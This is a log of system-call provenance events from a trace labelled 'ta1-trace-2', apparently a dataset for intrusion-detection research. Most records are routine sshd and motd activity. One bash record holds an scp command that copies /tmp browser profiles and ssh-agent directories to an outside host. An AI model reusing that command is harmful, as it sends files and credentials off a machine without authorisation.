1557775964.280:1588794723,A61841C0-9444-A377-A1AE-B263E23E24A6:run-parts,FORK,CF9F7148-16F0-4141-60F6-0B5A1B2F39C0,run-parts,ta1-trace-2
1557775964.280:1588794697,3EC2279A-A29B-6382-33C8-85A705C36692:update-motd-upd,EXECUTE,E5DB1994-1111-A71C-02C0-B749B386F51D,cat,ta1-trace-2
1557775964.280:1588794695,6E4EB9A2-8D50-B24D-91EE-6123DB2A3330:update-motd-upd,FORK,3EC2279A-A29B-6382-33C8-85A705C36692,update-motd-upd,ta1-trace-2
1557775964.264:1588793662,8D4F160E-6529-1A2D-2B8D-49A50A8B8DE3:90-updates-avai,EXECUTE,6E4EB9A2-8D50-B24D-91EE-6123DB2A3330,update-motd-upd,ta1-trace-2
1557775964.264:1588793641,4B1DB7BC-F15C-D8A8-256B-8F1F7FAC4F05:run-parts,EXECUTE,8D4F160E-6529-1A2D-2B8D-49A50A8B8DE3,90-updates-avai,ta1-trace-2
1557775964.264:1588793640,A61841C0-9444-A377-A1AE-B263E23E24A6:run-parts,FORK,4B1DB7BC-F15C-D8A8-256B-8F1F7FAC4F05,run-parts,ta1-trace-2
1557775964.136:1588786532,93398089-2003-9779-13F8-1249CABD8F91:landscape-sysin,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.128:1588786104,0DA9BA35-657A-C20D-7C13-032F818FAE69:50-landscape-sy,EXECUTE,93398089-2003-9779-13F8-1249CABD8F91,landscape-sysin,ta1-trace-2
1557775964.128:1588786102,72DFD2D8-50C6-E249-B06E-9B9E4D80DF27:50-landscape-sy,FORK,0DA9BA35-657A-C20D-7C13-032F818FAE69,50-landscape-sy,ta1-trace-2
1557775964.124:1588785852,81D2F8FA-4231-3632-DF47-FAF2305298C8:run-parts,EXECUTE,72DFD2D8-50C6-E249-B06E-9B9E4D80DF27,50-landscape-sy,ta1-trace-2
1557775964.124:1588785846,A61841C0-9444-A377-A1AE-B263E23E24A6:run-parts,FORK,81D2F8FA-4231-3632-DF47-FAF2305298C8,run-parts,ta1-trace-2
1557775964.120:1588785521,98F61125-BAD8-6C2F-B230-2F92A47F81EC:env,EXECUTE,A61841C0-9444-A377-A1AE-B263E23E24A6,run-parts,ta1-trace-2
1557775964.120:1588785503,BF183A70-F574-E4A6-DCC4-9DC0A91071C1:sh,EXECUTE,98F61125-BAD8-6C2F-B230-2F92A47F81EC,env,ta1-trace-2
1557775964.120:1588785496,BF3243C6-73C5-B564-D807-FC513BDE8593:sh,FORK,BF183A70-F574-E4A6-DCC4-9DC0A91071C1,sh,ta1-trace-2
1557775964.120:1588785448,BBE99059-8BF1-3E22-85E7-731BBF61D50D:sshd,EXECUTE,BF3243C6-73C5-B564-D807-FC513BDE8593,sh,ta1-trace-2
1557775964.120:1588785372,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,FORK,BBE99059-8BF1-3E22-85E7-731BBF61D50D,sshd,ta1-trace-2
1557775964.120:1588785324,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.100:1588785188,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.100:1588785136,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.100:1588785124,36999187-9C30-09C2-5204-E29E4ABF0D0B:sshd,CHANGE_PRINCIPAL,AAE16F4D-F751-568F-5F79-155F9CB8075A,sshd,ta1-trace-2
1557775964.100:1588785123,E415DA72-76BD-ACB6-C0C1-C63EE1DD5F1D:sshd,CHANGE_PRINCIPAL,36999187-9C30-09C2-5204-E29E4ABF0D0B,sshd,ta1-trace-2
1557775964.100:1588785122,36999187-9C30-09C2-5204-E29E4ABF0D0B:sshd,CHANGE_PRINCIPAL,E415DA72-76BD-ACB6-C0C1-C63EE1DD5F1D,sshd,ta1-trace-2
1557775964.100:1588785121,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,CHANGE_PRINCIPAL,36999187-9C30-09C2-5204-E29E4ABF0D0B,sshd,ta1-trace-2
1557775964.100:1588785119,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.100:1588785105,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.100:1588785065,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557775964.100:1588785062,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775964.092:1588785037,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557775964.092:1588785034,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.992:1588784777,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.992:1588784745,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557775963.992:1588784744,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557775963.876:1588784489,AAE16F4D-F751-568F-5F79-155F9CB8075A:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.872:1588784233,EC5C3D76-7D78-E3CE-9DB5-25F3F83860A1:sshd,EXECUTE,AAE16F4D-F751-568F-5F79-155F9CB8075A,sshd,ta1-trace-2
1557775963.872:1588784212,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,EC5C3D76-7D78-E3CE-9DB5-25F3F83860A1,sshd,ta1-trace-2
1557775963.412:1588782850,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.412:1588782847,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.412:1588782844,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.412:1588782841,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.412:1588782838,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.412:1588782835,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.412:1588782832,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.408:1588782810,A713D2CE-2F6C-1B13-C367-F2C4F95408B4:ssh,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.408:1588782715,0ED0D22E-1BEB-AAFF-2A42-B834E1C6F234:scp,EXECUTE,A713D2CE-2F6C-1B13-C367-F2C4F95408B4,ssh,ta1-trace-2
1557775963.408:1588782706,D267CA05-1343-7AD0-4EC2-0E4428B5F8C0:scp,FORK,0ED0D22E-1BEB-AAFF-2A42-B834E1C6F234,scp,ta1-trace-2
1557775963.408:1588782699,D267CA05-1343-7AD0-4EC2-0E4428B5F8C0:scp,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.408:1588782637,031BBAF2-04DE-9682-ABFE-6BB34DB83C3A:bash,EXECUTE,D267CA05-1343-7AD0-4EC2-0E4428B5F8C0,b'scp -r /tmp/admiredly /tmp/betulinic /tmp/diglottism /tmp/dystonias /tmp/firefox_admin /tmp/firefox_root /tmp/grains /tmp/hsperfdata_darpa /tmp/kleptomanist /tmp/matrilinear /tmp/misy /tmp/mozilla_admin0 /tmp/MozillaMailnews /tmp/ssh-Q1Lt0fJdysyl /tmp/ssh-s36A7BKbgG /tmp/ssh-weL2TqO0XtQu /tmp/stalled /tmp/syconate /tmp/thetine admin@128.55.12.124:\\C:WindowsTemp',ta1-trace-2
1557775963.408:1588782631,8C3CA5F1-9345-C2C1-471C-D86E7340F261:bash,FORK,031BBAF2-04DE-9682-ABFE-6BB34DB83C3A,bash,ta1-trace-2
1557775963.232:1588779772,8C3CA5F1-9345-C2C1-471C-D86E7340F261:bash,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.232:1588779689,7E3E869D-CBB2-2828-A455-D70ADFE912A8:sshd,EXECUTE,8C3CA5F1-9345-C2C1-471C-D86E7340F261,bash,ta1-trace-2
1557775963.228:1588779582,CABBEB2E-FD8E-4E3B-2597-87BE7663800F:sshd,FORK,7E3E869D-CBB2-2828-A455-D70ADFE912A8,sshd,ta1-trace-2
1557775963.228:1588779529,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.228:1588779523,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.228:1588779503,870FAB26-DA38-11FF-4403-64D380FA2C4A:sshd,CHANGE_PRINCIPAL,CABBEB2E-FD8E-4E3B-2597-87BE7663800F,sshd,ta1-trace-2
1557775963.228:1588779481,879C4F2F-2897-6E93-D891-AE79B350A58D:sshd,CHANGE_PRINCIPAL,870FAB26-DA38-11FF-4403-64D380FA2C4A,sshd,ta1-trace-2
1557775963.228:1588779478,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,FORK,879C4F2F-2897-6E93-D891-AE79B350A58D,sshd,ta1-trace-2
1557775963.228:1588779469,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.228:1588779433,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.228:1588779430,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.228:1588779427,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.224:1588779351,5A2DA7D8-3B7B-562E-3AF5-60FACD742109:update-motd-fsc,EXECUTE,1BB9A6CF-CB7D-AF00-D113-0DD800CB884C,cat,ta1-trace-2
1557775963.224:1588779349,E2C36357-4F3E-561A-B5A8-3C22CED5E802:update-motd-fsc,FORK,5A2DA7D8-3B7B-562E-3AF5-60FACD742109,update-motd-fsc,ta1-trace-2
1557775963.224:1588779134,29C15D5D-86C3-3D7B-157B-2E1059622B16:98-fsck-at-rebo,EXECUTE,E2C36357-4F3E-561A-B5A8-3C22CED5E802,update-motd-fsc,ta1-trace-2
1557775963.224:1588779112,29448AC2-1B17-42EA-FE76-7E29D549BCC9:run-parts,EXECUTE,29C15D5D-86C3-3D7B-157B-2E1059622B16,98-fsck-at-rebo,ta1-trace-2
1557775963.224:1588779111,DBAA3FC6-0996-5901-E9B6-0D7C73D0A06E:run-parts,FORK,29448AC2-1B17-42EA-FE76-7E29D549BCC9,run-parts,ta1-trace-2
1557775963.224:1588779062,1C3D5076-B429-F606-7B79-9F4CE5DF5B99:update-motd-hwe,EXECUTE,7FBE918E-4DAB-2C86-8D01-3B0AB5929133,cat,ta1-trace-2
1557775963.224:1588779060,7C565C88-18B4-E0BC-9C1E-5D7F35951C2C:update-motd-hwe,FORK,1C3D5076-B429-F606-7B79-9F4CE5DF5B99,update-motd-hwe,ta1-trace-2
1557775963.204:1588777711,34DCED44-616B-711E-19CB-937E65D0226B:95-hwe-eol,EXECUTE,7C565C88-18B4-E0BC-9C1E-5D7F35951C2C,update-motd-hwe,ta1-trace-2
1557775963.204:1588777690,EAF6C8B7-26B5-A418-A991-48A267C121B6:run-parts,EXECUTE,34DCED44-616B-711E-19CB-937E65D0226B,95-hwe-eol,ta1-trace-2
1557775963.204:1588777689,DBAA3FC6-0996-5901-E9B6-0D7C73D0A06E:run-parts,FORK,EAF6C8B7-26B5-A418-A991-48A267C121B6,run-parts,ta1-trace-2
1557775963.180:1588777353,3512A8C2-19BA-E4E0-E784-368B3731939B:lsb_release,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.168:1588777111,D625665D-CA53-0D01-D3A4-4FF825FCDA46:91-release-upgr,EXECUTE,3512A8C2-19BA-E4E0-E784-368B3731939B,lsb_release,ta1-trace-2
1557775963.168:1588777104,891454C7-003E-6412-4F8D-7D4F955B93F2:91-release-upgr,FORK,D625665D-CA53-0D01-D3A4-4FF825FCDA46,91-release-upgr,ta1-trace-2
1557775963.168:1588777097,013E23AB-AD0A-1225-CC4B-0C94DC16AE60:91-release-upgr,FORK,891454C7-003E-6412-4F8D-7D4F955B93F2,91-release-upgr,ta1-trace-2
1557775963.168:1588777075,64ACD7B9-AA6F-47E0-217F-A5796E472CCB:run-parts,EXECUTE,013E23AB-AD0A-1225-CC4B-0C94DC16AE60,91-release-upgr,ta1-trace-2
1557775963.168:1588777074,DBAA3FC6-0996-5901-E9B6-0D7C73D0A06E:run-parts,FORK,64ACD7B9-AA6F-47E0-217F-A5796E472CCB,run-parts,ta1-trace-2
1557775963.168:1588777048,34830906-2EED-D092-B58C-6F53F504C83E:update-motd-upd,EXECUTE,369F71AF-3211-870A-DA6C-EF13FDBAA56C,cat,ta1-trace-2
1557775963.168:1588777046,51692970-F966-EB6F-E25B-5B2369AC2A0F:update-motd-upd,FORK,34830906-2EED-D092-B58C-6F53F504C83E,update-motd-upd,ta1-trace-2
1557775963.148:1588776014,6ECA2A59-5B36-C545-ED0B-E2D7098893FD:90-updates-avai,EXECUTE,51692970-F966-EB6F-E25B-5B2369AC2A0F,update-motd-upd,ta1-trace-2
1557775963.148:1588775993,198987B9-73F2-0EB5-5A9B-C0CF7AF852C1:run-parts,EXECUTE,6ECA2A59-5B36-C545-ED0B-E2D7098893FD,90-updates-avai,ta1-trace-2
1557775963.148:1588775992,DBAA3FC6-0996-5901-E9B6-0D7C73D0A06E:run-parts,FORK,198987B9-73F2-0EB5-5A9B-C0CF7AF852C1,run-parts,ta1-trace-2
1557775963.008:1588768961,B5E9E252-37ED-EE20-FF00-B5ADDAC099BE:landscape-sysin,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775963.000:1588768518,FE447BAE-E7DB-F5F4-5912-82317F5EBA6C:50-landscape-sy,EXECUTE,B5E9E252-37ED-EE20-FF00-B5ADDAC099BE,landscape-sysin,ta1-trace-2
1557775963.000:1588768516,6BBAB1B2-7098-0FB1-9272-BB6998EAB015:50-landscape-sy,FORK,FE447BAE-E7DB-F5F4-5912-82317F5EBA6C,50-landscape-sy,ta1-trace-2
1557775962.996:1588768251,A2E91E86-4A5F-F0A3-EBDF-9022AF38C60B:run-parts,EXECUTE,6BBAB1B2-7098-0FB1-9272-BB6998EAB015,50-landscape-sy,ta1-trace-2
1557775962.996:1588768250,DBAA3FC6-0996-5901-E9B6-0D7C73D0A06E:run-parts,FORK,A2E91E86-4A5F-F0A3-EBDF-9022AF38C60B,run-parts,ta1-trace-2
1557775962.992:1588767936,9E7CEE17-7CA8-3098-A230-AD2698CFE9E2:env,EXECUTE,DBAA3FC6-0996-5901-E9B6-0D7C73D0A06E,run-parts,ta1-trace-2
1557775962.992:1588767905,F26188F7-648F-713B-BB3B-7E41040F93A0:sh,EXECUTE,9E7CEE17-7CA8-3098-A230-AD2698CFE9E2,env,ta1-trace-2
1557775962.992:1588767880,F572DA3A-CAC0-2DDB-1175-E574F9EDB51F:sh,FORK,F26188F7-648F-713B-BB3B-7E41040F93A0,sh,ta1-trace-2
1557775962.992:1588767827,B8DA4A25-254D-354B-D95B-827E8EBF5D9A:sshd,EXECUTE,F572DA3A-CAC0-2DDB-1175-E574F9EDB51F,sh,ta1-trace-2
1557775962.992:1588767801,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,FORK,B8DA4A25-254D-354B-D95B-827E8EBF5D9A,sshd,ta1-trace-2
1557775962.992:1588767732,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.976:1588767425,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.976:1588767373,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.976:1588767361,7FD316EE-3114-8EAF-281E-F2ACB897C615:sshd,CHANGE_PRINCIPAL,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520,sshd,ta1-trace-2
1557775962.976:1588767360,77709DAF-AAD5-1749-8E87-57FDF44A4C33:sshd,CHANGE_PRINCIPAL,7FD316EE-3114-8EAF-281E-F2ACB897C615,sshd,ta1-trace-2
1557775962.976:1588767359,7FD316EE-3114-8EAF-281E-F2ACB897C615:sshd,CHANGE_PRINCIPAL,77709DAF-AAD5-1749-8E87-57FDF44A4C33,sshd,ta1-trace-2
1557775962.976:1588767358,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,CHANGE_PRINCIPAL,7FD316EE-3114-8EAF-281E-F2ACB897C615,sshd,ta1-trace-2
1557775962.976:1588767356,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.976:1588767342,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.976:1588767302,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557775962.976:1588767299,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.968:1588767274,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557775962.968:1588767271,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.868:1588767048,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.868:1588767016,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557775962.868:1588767015,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557775962.764:1588766800,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.760:1588766544,624DD5A2-56E0-01D9-D334-6150D5752DC5:sshd,EXECUTE,25E8E0EA-B4D1-4E9C-BD5F-B327B2909520,sshd,ta1-trace-2
1557775962.756:1588766523,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,624DD5A2-56E0-01D9-D334-6150D5752DC5,sshd,ta1-trace-2
1557775962.604:1588765267,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.604:1588765195,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.604:1588765117,216177D4-BEAF-F0E6-CC87-568FCA42606D:sshd,CHANGE_PRINCIPAL,3022F6BE-BF98-667C-03F3-E4976CD6CD3B,sshd,ta1-trace-2
1557775962.604:1588765116,216177D4-BEAF-F0E6-CC87-568FCA42606D:sshd,CHANGE_PRINCIPAL,216177D4-BEAF-F0E6-CC87-568FCA42606D,sshd,ta1-trace-2
1557775962.604:1588765115,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,CHANGE_PRINCIPAL,216177D4-BEAF-F0E6-CC87-568FCA42606D,sshd,ta1-trace-2
1557775962.312:1588762254,5AE9DAAC-5B93-4DDD-AE18-F9EC52842088:bash,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.312:1588762171,CF90AC58-4EEC-BF46-62FF-E758A53F5474:sshd,EXECUTE,5AE9DAAC-5B93-4DDD-AE18-F9EC52842088,bash,ta1-trace-2
1557775962.312:1588762064,40ABB362-0939-A431-D3B7-D399D3697019:sshd,FORK,CF90AC58-4EEC-BF46-62FF-E758A53F5474,sshd,ta1-trace-2
1557775962.312:1588762011,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.312:1588762005,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.312:1588761985,5353C22D-1889-00DB-6256-7DFADDD0EC14:sshd,CHANGE_PRINCIPAL,40ABB362-0939-A431-D3B7-D399D3697019,sshd,ta1-trace-2
1557775962.312:1588761963,8248BADC-3F01-0289-BF61-B8DC02A43CE6:sshd,CHANGE_PRINCIPAL,5353C22D-1889-00DB-6256-7DFADDD0EC14,sshd,ta1-trace-2
1557775962.312:1588761960,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,FORK,8248BADC-3F01-0289-BF61-B8DC02A43CE6,sshd,ta1-trace-2
1557775962.308:1588761951,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.308:1588761915,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.308:1588761912,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.308:1588761909,3022F6BE-BF98-667C-03F3-E4976CD6CD3B:sshd,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.308:1588761832,82A55E39-267A-1FB6-1184-5415B3AE5405:update-motd-fsc,EXECUTE,5F749D65-E45A-BB3B-F63F-F60615395ADA,cat,ta1-trace-2
1557775962.308:1588761830,CACF7AAD-6823-4EAB-D45A-A2B191629A4F:update-motd-fsc,FORK,82A55E39-267A-1FB6-1184-5415B3AE5405,update-motd-fsc,ta1-trace-2
1557775962.304:1588761615,EC18927E-0193-B88D-0DD5-8712D9080AF0:98-fsck-at-rebo,EXECUTE,CACF7AAD-6823-4EAB-D45A-A2B191629A4F,update-motd-fsc,ta1-trace-2
1557775962.304:1588761593,510B7B66-A07B-6BDA-347E-ECC01EAFC5FE:run-parts,EXECUTE,EC18927E-0193-B88D-0DD5-8712D9080AF0,98-fsck-at-rebo,ta1-trace-2
1557775962.304:1588761592,3BF9D015-EB17-3ED1-E326-996DFB8B4932:run-parts,FORK,510B7B66-A07B-6BDA-347E-ECC01EAFC5FE,run-parts,ta1-trace-2
1557775962.304:1588761543,98797F0D-8BF2-872D-46A0-CE66FA152C86:update-motd-hwe,EXECUTE,9AF11795-A26D-0D33-980C-258B2E387192,cat,ta1-trace-2
1557775962.304:1588761541,4FD1AA75-FF1D-4E70-2A93-9C6766F23B91:update-motd-hwe,FORK,98797F0D-8BF2-872D-46A0-CE66FA152C86,update-motd-hwe,ta1-trace-2
1557775962.284:1588760198,2FF7A848-5468-67C9-B847-49763769DBC1:95-hwe-eol,EXECUTE,4FD1AA75-FF1D-4E70-2A93-9C6766F23B91,update-motd-hwe,ta1-trace-2
1557775962.284:1588760177,90EC80EA-A784-8988-A65F-5A60BA412361:run-parts,EXECUTE,2FF7A848-5468-67C9-B847-49763769DBC1,95-hwe-eol,ta1-trace-2
1557775962.284:1588760176,3BF9D015-EB17-3ED1-E326-996DFB8B4932:run-parts,FORK,90EC80EA-A784-8988-A65F-5A60BA412361,run-parts,ta1-trace-2
1557775962.264:1588759840,B3793F77-D81F-2CF8-C339-35E53B3D87BF:lsb_release,MMAP,5081ADB0-427F-41C6-73E3-BA4395F33AAB,/etc/passwd,ta1-trace-2
1557775962.252:1588759600,9501995B-4B80-B416-EDC9-09DAC23D8F1D:91-release-upgr,EXECUTE,B3793F77-D81F-2CF8-C339-35E53B3D87BF,lsb_release,ta1-trace-2
1557775962.252:1588759591,EF024F29-AFA0-AF2F-AC56-E8A0AF674F73:91-release-upgr,FORK,9501995B-4B80-B416-EDC9-09DAC23D8F1D,91-release-upgr,ta1-trace-2
1557775962.252:1588759584,B53A9A42-66BA-FF47-7733-00660D467548:91-release-upgr,FORK,EF024F29-AFA0-AF2F-AC56-E8A0AF674F73,91-release-upgr,ta1-trace-2
1557775962.252:1588759562,FAAB070C-76CE-EC8A-8978-7AE2FF138A3D:run-parts,EXECUTE,B53A9A42-66BA-FF47-7733-00660D467548,91-release-upgr,ta1-trace-2
1557775962.252:1588759561,3BF9D015-EB17-3ED1-E326-996DFB8B4932:run-parts,FORK,FAAB070C-76CE-EC8A-8978-7AE2FF138A3D,run-parts,ta1-trace-2
1557775962.252:1588759535,19EEBD8C-9D58-D725-21A3-65828BCC7258:update-motd-upd,EXECUTE,96162BB8-E29F-B0D3-6A50-EF0E6F5327F3,cat,ta1-trace-2
